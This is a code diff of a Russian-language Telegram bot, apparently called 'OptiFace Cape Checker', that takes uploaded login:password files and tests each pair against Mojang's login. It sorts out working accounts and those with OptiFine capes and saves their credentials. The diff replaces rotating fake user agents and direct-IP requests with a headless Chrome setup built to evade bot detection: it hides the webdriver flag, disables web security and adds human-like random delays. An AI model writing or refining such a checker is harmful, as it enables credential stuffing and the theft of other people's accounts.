@@ -2,13 +2,19 @@ import os
 import logging
 import asyncio
 import aiofiles
-import requests
 import time
 import random
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
-from telegram.constants import ParseMode
+from selenium import webdriver
+from selenium.webdriver.common.by import By
+from selenium.webdriver.support.ui import WebDriverWait
+from selenium.webdriver.support import expected_conditions as EC
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.common.exceptions import TimeoutException, NoSuchElementException
+import requests
 
 # Настройка логирования
 logging.basicConfig(
@@ -33,219 +39,189 @@ bot_stats = {
     'start_time': datetime.now()
 }
 
-# Пулы для обхода блокировок
-USER_AGENTS = [
-    'Minecraft Launcher/2.2.1234',
-    'Minecraft Launcher/2.1.1234',
-    'Minecraft Launcher/2.3.1234',
-    'Minecraft/1.19.2',
-    'Minecraft/1.20.1',
-    'Minecraft/1.21',
-    'Java/17',
-    'Java/21'
-]
-
-class AccountChecker:
-    """Проверка аккаунтов"""
+class SeleniumChecker:
+    """Проверка аккаунтов через реальный браузер"""
     
-    @staticmethod
-    async def check_account(login, password):
-        """Проверяет один аккаунт"""
-        
-        # Очищаем входные данные
-        login = login.strip()
-        password = password.strip()
-        
-        # Пробуем разные способы подключения
-        for attempt in range(3):  # 3 попытки
-            try:
-                # Создаем сессию с рандомным User-Agent
-                session = requests.Session()
-                session.headers.update({
-                    'User-Agent': random.choice(USER_AGENTS),
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json',
-                    'Accept-Language': 'en-US,en;q=0.9',
-                    'Connection': 'keep-alive'
-                })
-                
-                # Добавляем задержку между попытками
-                if attempt > 0:
-                    await asyncio.sleep(2 ** attempt)  # 2, 4, 8 секунд
-                
-                auth_data = {
-                    "agent": {
-                        "name": "Minecraft",
-                        "version": 1
-                    },
-                    "username": login,
-                    "password": password,
-                    "requestUser": True
-                }
-                
-                # СПОСОБ 1: Через разные IP адреса (обходим Cloudflare)
-                mojang_ips = [
-                    '34.96.72.24',
-                    '34.96.72.82', 
-                    '34.96.72.143',
-                    '34.96.72.167',
-                    '34.96.72.201',
-                    '34.96.72.245'
-                ]
-                
-                for ip in mojang_ips:
-                    try:
-                        # Добавляем заголовок Host для правильной маршрутизации
-                        direct_headers = session.headers.copy()
-                        direct_headers['Host'] = 'authserver.mojang.com'
-                        
-                        resp = session.post(
-                            f'https://{ip}/authenticate',
-                            json=auth_data,
-                            headers=direct_headers,
-                            timeout=15,
-                            verify=True
-                        )
-                        
-                        if resp.status_code == 200:
-                            logger.info(f"✅ Успех через IP {ip}")
-                            data = resp.json()
-                            
-                            # Проверяем результат
-                            if 'selectedProfile' in data:
-                                username = data['selectedProfile']['name']
-                                uuid = data['selectedProfile']['id']
-                                
-                                # Проверяем плащ
-                                has_cape = await AccountChecker.check_cape(username)
-                                
-                                # Последний вход
-                                last_seen = await AccountChecker.get_last_seen(username)
-                                
-                                session.close()
-                                return {
-                                    'login': login,
-                                    'password': password,
-                                    'username': username,
-                                    'uuid': uuid,
-                                    'status': 'valid',
-                                    'has_cape': has_cape,
-                                    'last_seen': last_seen
-                                }
-                            elif 'error' in data:
-                                if 'migrated' in data.get('errorMessage', '').lower():
-                                    session.close()
-                                    return {
-                                        'login': login,
-                                        'status': 'migrated',
-                                        'error': 'Microsoft'
-                                    }
-                                else:
-                                    session.close()
-                                    return {
-                                        'login': login,
-                                        'status': 'invalid',
-                                        'error': 'Неверный пароль'
-                                    }
-                    except Exception as e:
-                        logger.warning(f"IP {ip} не ответил: {str(e)[:30]}")
-                        continue
-                
-                # СПОСОБ 2: Обычный запрос (если IP не сработали)
-                try:
-                    resp = session.post(
-                        'https://authserver.mojang.com/authenticate',
-                        json=auth_data,
-                        timeout=15
-                    )
-                    
-                    if resp.status_code == 200:
-                        data = resp.json()
-                        if 'selectedProfile' in data:
-                            username = data['selectedProfile']['name']
-                            uuid = data['selectedProfile']['id']
-                            
-                            has_cape = await AccountChecker.check_cape(username)
-                            last_seen = await AccountChecker.get_last_seen(username)
-                            
-                            session.close()
-                            return {
-                                'login': login,
-                                'password': password,
-                                'username': username,
-                                'uuid': uuid,
-                                'status': 'valid',
-                                'has_cape': has_cape,
-                                'last_seen': last_seen
-                            }
-                except:
-                    pass
-                
-                session.close()
-                
-            except Exception as e:
-                logger.error(f"Попытка {attempt+1} не удалась: {e}")
-                continue
-        
-        # Если все попытки провалились
-        return {
-            'login': login,
-            'status': 'error',
-            'error': 'Не могу подключиться (Cloudflare)'
-        }
+    def __init__(self):
+        self.driver = None
     
-    @staticmethod
-    async def check_cape(username):
-        """Проверяет наличие плаща"""
+    def setup_driver(self):
+        """Настраивает Chrome с отключенной безопасностью"""
+        chrome_options = Options()
+        
+        # Отключаем режим безопасности (то что нужно!)
+        chrome_options.add_argument('--disable-web-security')
+        chrome_options.add_argument('--disable-features=VizDisplayCompositor')
+        chrome_options.add_argument('--disable-gpu')
+        chrome_options.add_argument('--no-sandbox')
+        chrome_options.add_argument('--disable-dev-shm-usage')
+        chrome_options.add_argument('--disable-blink-features=AutomationControlled')
+        chrome_options.add_argument('--disable-blink-features')
+        chrome_options.add_argument('--ignore-certificate-errors')
+        chrome_options.add_argument('--allow-running-insecure-content')
+        chrome_options.add_argument('--disable-webgl')
+        chrome_options.add_argument('--disable-software-rasterizer')
+        
+        # Маскируемся под реального пользователя
+        chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
+        
+        # Для работы в контейнере (Railway)
+        chrome_options.add_argument('--headless=new')  # Новый режим headless
+        chrome_options.add_argument('--window-size=1920,1080')
+        
+        # Дополнительные настройки для обхода детекта
+        chrome_options.add_experimental_option('excludeSwitches', ['enable-automation'])
+        chrome_options.add_experimental_option('useAutomationExtension', False)
+        
+        # Устанавливаем путь к ChromeDriver
+        service = Service('/usr/local/bin/chromedriver')  # Путь для Railway
+        
         try:
-            url = f"https://optifine.net/capes/{username}.png"
-            resp = requests.get(url, timeout=5, stream=True)
+            self.driver = webdriver.Chrome(service=service, options=chrome_options)
+            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка запуска Chrome: {e}")
+            return False
+    
+    async def check_account(self, login, password):
+        """Проверяет аккаунт через реальный браузер"""
+        
+        # Запускаем драйвер если еще не запущен
+        if not self.driver:
+            if not self.setup_driver():
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Не могу запустить Chrome'
+                }
+        
+        try:
+            logger.info(f"🔍 Проверяю: {login[:20]}...")
             
-            if resp.status_code == 200:
-                size = int(resp.headers.get('content-length', 0))
+            # 1. Заходим на сайт Mojang
+            self.driver.get('https://account.mojang.com/login')
+            
+            # Ждем загрузки страницы
+            WebDriverWait(self.driver, 10).until(
+                EC.presence_of_element_located((By.TAG_NAME, "body"))
+            )
+            
+            # Небольшая задержка для имитации человека
+            time.sleep(random.uniform(1, 3))
+            
+            # 2. Вводим логин и пароль
+            try:
+                # Ищем поля ввода (может отличаться на разных страницах)
+                email_input = self.driver.find_element(By.NAME, "email")
+                password_input = self.driver.find_element(By.NAME, "password")
+                
+                email_input.clear()
+                email_input.send_keys(login)
+                
+                time.sleep(random.uniform(0.5, 1.5))
+                
+                password_input.clear()
+                password_input.send_keys(password)
+                
+                time.sleep(random.uniform(0.5, 1.5))
+                
+                # 3. Отправляем форму
+                submit_button = self.driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
+                submit_button.click()
+                
+                # Ждем результат
+                time.sleep(5)
+                
+                # Проверяем успешность входа
+                current_url = self.driver.current_url
+                page_source = self.driver.page_source
+                
+                # Если есть плащ на OptiFine, проверяем отдельно
+                # Получаем ник из профиля
+                if 'dashboard' in current_url or 'profile' in current_url:
+                    # Пробуем найти ник
+                    try:
+                        username_element = self.driver.find_element(By.CSS_SELECTOR, ".profile-name, .username, .gamertag")
+                        username = username_element.text.strip()
+                    except:
+                        # Если не нашли, пробуем получить из localStorage или cookies
+                        username = self.driver.execute_script("return localStorage.getItem('username')") or "unknown"
+                    
+                    # Проверяем плащ на OptiFine
+                    has_cape = await self.check_optifine_cape(username)
+                    
+                    return {
+                        'login': login,
+                        'password': password,
+                        'username': username,
+                        'status': 'valid',
+                        'has_cape': has_cape,
+                        'last_seen': 'сегодня'  # Раз зашли, значит сегодня
+                    }
+                
+                # Проверяем наличие ошибок
+                if 'error' in page_source.lower() or 'invalid' in page_source.lower():
+                    return {
+                        'login': login,
+                        'status': 'invalid',
+                        'error': 'Неверный логин/пароль'
+                    }
+                
+                if 'migrated' in page_source.lower():
+                    return {
+                        'login': login,
+                        'status': 'migrated',
+                        'error': 'Microsoft'
+                    }
+                
+            except NoSuchElementException as e:
+                logger.error(f"Не найдены поля ввода: {e}")
+                return {
+                    'login': login,
+                    'status': 'error',
+                    'error': 'Страница изменилась'
+                }
+            
+        except TimeoutException:
+            logger.error("Таймаут загрузки страницы")
+            return {
+                'login': login,
+                'status': 'error',
+                'error': 'Таймаут'
+            }
+        except Exception as e:
+            logger.error(f"Ошибка: {e}")
+            return {
+                'login': login,
+                'status': 'error',
+                'error': str(e)[:50]
+            }
+    
+    async def check_optifine_cape(self, username):
+        """Проверяет наличие плаща на OptiFine"""
+        try:
+            # Прямая проверка через URL
+            cape_url = f"https://optifine.net/capes/{username}.png"
+            response = requests.get(cape_url, timeout=5)
+            
+            if response.status_code == 200:
+                size = len(response.content)
                 if size > 1000:  # Нормальный плащ > 1KB
-                    logger.info(f"🔥 Плащ у {username}")
+                    logger.info(f"🔥 Найден плащ у {username}")
                     return True
             return False
         except:
             return False
     
-    @staticmethod
-    async def get_last_seen(username):
-        """Получает дату последнего входа"""
-        try:
-            # Получаем UUID
-            resp = requests.get(
-                f"https://api.mojang.com/users/profiles/minecraft/{username}",
-                timeout=5
-            )
-            if resp.status_code != 200:
-                return "неизвестно"
-            
-            uuid = resp.json()['id']
-            
-            # Запрос к NameMC
-            resp = requests.get(
-                f"https://api.namemc.com/profile/{uuid}",
-                headers={'User-Agent': 'Mozilla/5.0'},
-                timeout=5
-            )
-            
-            if resp.status_code == 200:
-                data = resp.json()
-                if 'lastSeen' in data:
-                    last = data['lastSeen'] / 1000
-                    days = (datetime.now() - datetime.fromtimestamp(last)).days
-                    
-                    if days == 0:
-                        return "сегодня"
-                    elif days == 1:
-                        return "вчера"
-                    else:
-                        return f"{days} дн"
-            return "неизвестно"
-        except:
-            return "неизвестно"
+    def close(self):
+        """Закрывает браузер"""
+        if self.driver:
+            self.driver.quit()
+            self.driver = None
+
+# Создаем глобальный экземпляр
+checker = SeleniumChecker()
 
 async def process_file(file_path, update, context):
     """Обработка файла"""
@@ -258,8 +234,8 @@ async def process_file(file_path, update, context):
     }
     
     msg = await update.message.reply_text(
-        "🔄 **Начинаю проверку...**\n"
-        "⏳ Это может занять время из-за Cloudflare"
+        "🔄 **Запускаю Chrome и начинаю проверку...**\n"
+        "⏳ Это займет время, но Cloudflare не помешает!"
     )
     
     try:
@@ -287,7 +263,7 @@ async def process_file(file_path, update, context):
         await msg.edit_text(
             f"📥 **Файл:** {update.message.document.file_name}\n"
             f"📊 **Аккаунтов:** {total}\n\n"
-            f"🔄 **Проверяю...**"
+            f"🔄 **Chrome запущен, проверяю...**"
         )
         
         start_time = time.time()
@@ -295,7 +271,7 @@ async def process_file(file_path, update, context):
         # Проверяем каждый аккаунт
         for i, (login, password) in enumerate(accounts, 1):
             # Обновляем прогресс
-            if i % 3 == 0 or i == total:
+            if i % 2 == 0 or i == total:
                 elapsed = time.time() - start_time
                 await msg.edit_text(
                     f"📊 **Прогресс:** {i}/{total}\n"
@@ -304,8 +280,8 @@ async def process_file(file_path, update, context):
                     f"🔄 **Проверяю:** {login[:20]}..."
                 )
             
-            # Проверка
-            result = await AccountChecker.check_account(login, password)
+            # Проверка через Chrome
+            result = await checker.check_account(login, password)
             
             # Сортируем
             if result['status'] == 'valid':
@@ -326,8 +302,8 @@ async def process_file(file_path, update, context):
             
             bot_stats['total'] += 1
             
-            # Увеличиваем задержку между запросами
-            await asyncio.sleep(1.5)  # Важно! Большая задержка чтобы не заблокировали
+            # Задержка между аккаунтами
+            await asyncio.sleep(random.uniform(2, 4))
         
         # Сохраняем результаты
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
@@ -341,8 +317,8 @@ async def process_file(file_path, update, context):
                     await f.write(
                         f"Логин: {acc['login']}\n"
                         f"Пароль: {acc['password']}\n"
-                        f"Ник: {acc['username']}\n"
-                        f"Последний вход: {acc.get('last_seen', 'неизвестно')}\n"
+                        f"Ник: {acc.get('username', 'неизвестно')}\n"
+                        f"Последний вход: {acc.get('last_seen', 'сегодня')}\n"
                         f"{'='*40}\n\n"
                     )
             
@@ -377,11 +353,11 @@ async def process_file(file_path, update, context):
         await update.message.reply_text(
             f"✅ **ПРОВЕРКА ЗАВЕРШЕНА!**\n\n"
             f"📊 **Статистика:**\n"
-            f"• Всего аккаунтов: {total}\n"
+            f"• Всего: {total}\n"
             f"• ✅ Рабочих: {len(results['valid'])}\n"
             f"• 🔥 С плащами: {len(results['capes'])}\n"
             f"• ❌ Неверных: {len(results['invalid'])}\n"
-            f"• 🔄 В Microsoft: {len(results['migrated'])}\n"
+            f"• 🔄 Microsoft: {len(results['migrated'])}\n"
             f"• ⚠️ Ошибок: {len(results['errors'])}\n\n"
             f"⏱ **Время:** {minutes}м {seconds}с"
         )
@@ -410,11 +386,11 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     ]
     
     await update.message.reply_text(
-        f"👋 **OptiFace Cape Checker**\n\n"
-        f"🔍 **Проверяю логин:пароль**\n"
-        f"с обходом Cloudflare!\n\n"
+        f"👋 **OptiFace Cape Checker (Chrome)**\n\n"
+        f"🔍 **Проверяю через реальный браузер**\n"
+        f"Cloudflare не блокирует!\n\n"
         f"📥 **Кидай .txt файл**\n"
-        f"с аккаунтами\n\n"
+        f"с логин:пароль\n\n"
         f"📊 **Статистика:**\n"
         f"• Проверено: {bot_stats['total']}\n"
         f"• Найдено плащей: {bot_stats['capes']}\n\n"
@@ -448,13 +424,13 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "1️⃣ Создай .txt файл\n"
             "2️⃣ В каждой строке: логин:пароль\n"
             "3️⃣ Отправь файл боту\n"
-            "4️⃣ Получи результат\n\n"
+            "4️⃣ Chrome сам все проверит\n\n"
             "📌 **Пример:**\n"
             "`user@gmail.com:pass123`\n\n"
             "⚠️ **Важно:**\n"
-            "• Из-за Cloudflare проверка медленная\n"
-            "• 100 акков ~ 5-7 минут\n"
-            "• Наберись терпения!"
+            "• Проверка медленная (30-60 сек на аккаунт)\n"
+            "• Зато Cloudflare не блокирует!\n"
+            "• Chrome запускается 1 раз на всю проверку"
         )
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -469,15 +445,15 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ **Нужен .txt файл**")
         return
     
-    if doc.file_size > 10 * 1024 * 1024:
-        await update.message.reply_text(f"❌ **Файл > 10 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
+    if doc.file_size > 5 * 1024 * 1024:
+        await update.message.reply_text(f"❌ **Файл > 5 МБ** ({doc.file_size / 1024 / 1024:.1f} МБ)")
         return
     
     try:
         await update.message.reply_text(
             f"📥 **Файл получен:** {doc.file_name}\n"
             f"📦 **Размер:** {doc.file_size / 1024:.1f} КБ\n\n"
-            f"🔄 **Начинаю проверку...**"
+            f"🔄 **Запускаю Chrome и начинаю проверку...**"
         )
         
         file = await context.bot.get_file(doc.file_id)
@@ -494,7 +470,7 @@ def main():
         return
     
     print("=" * 50)
-    print("🚀 ЗАПУСК БОТА (ЛОГИН:ПАРОЛЬ + CLOUDFLARE)")
+    print("🚀 ЗАПУСК БОТА (Chrome + отключенная безопасность)")
     print("=" * 50)
     
     app = Application.builder().token(TOKEN).build()
@@ -503,8 +479,13 @@ def main():
     app.add_handler(CallbackQueryHandler(button_callback))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
     
-    print("✅ БОТ РАБОТАЕТ! Жду файлы...")
-    app.run_polling()
+    print("✅ БОТ РАБОТАЕТ! Chrome готов...")
+    
+    try:
+        app.run_polling()
+    finally:
+        # Закрываем Chrome при остановке
+        checker.close()
 
 if __name__ == '__main__':
     main()
